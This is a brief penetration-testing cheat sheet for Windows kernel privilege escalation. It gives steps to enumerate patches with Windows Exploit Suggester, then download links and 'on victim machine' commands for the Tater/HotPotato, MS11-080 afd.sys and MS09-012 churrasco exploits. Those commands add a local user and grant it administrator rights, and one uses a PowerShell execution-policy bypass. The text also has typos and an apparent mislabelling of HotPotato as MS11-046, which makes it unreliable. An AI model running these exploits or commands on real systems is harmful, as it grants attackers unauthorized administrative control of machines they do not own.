# Kernel Exploits

In order to find relevant MS-* exploits for target, first dump its general information using the command:

```
systeminfo > systeminfo.txt
```

Then, use Windows Exploit Suggester as following locally / remote:

```
python3 wes.py systeminfo.txt
```

*NOTE:* Download Windows Exploit Suggester from here: https://github.com/bitsadmin/wesng

## Useful Exploits

### MS11-046: HotPotato 

For Windows 7,8,10, Server 2008, Server 2012.

Download from the Github project: https://github.com/Kevin-Robertson/Tater

Example of execute on victim machine using powershell:

```
C:\> powershell.exe -nop -ep bypass
PS:\> Import-Module C:\Users\User\Desktop\Tater.ps1
PS:\> Invoke-Tater -Trigger 1 -Command "net localgroup
administrators user /add
```

### MS11-080: 'afd.sys' Local Privilege Escalation

For Microsoft Windows XP/2003.

Downloaf from here: https://www.exploit-db.com/exploits/18176

Compile using pyinstaller:

```
root@kali:~/#: python pyinstaller.py --onefile ms11-080.py
```

Execute on victim machine:

```
C:\> mx11-080.exe -O XP
```

### MS09-012: Token Kidnapping Local Privilege Escalation ("churrasco")

For Windows Server 2003 and IIS 6.0.

Download from here: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012

Execute on the victim machine:

```
C:\Inetpub>churrasco.exe -d "net user /add <username> <password>"
C:\Inetpub>churrasco.exe -d "net localgroup administrators <username> /add"
```
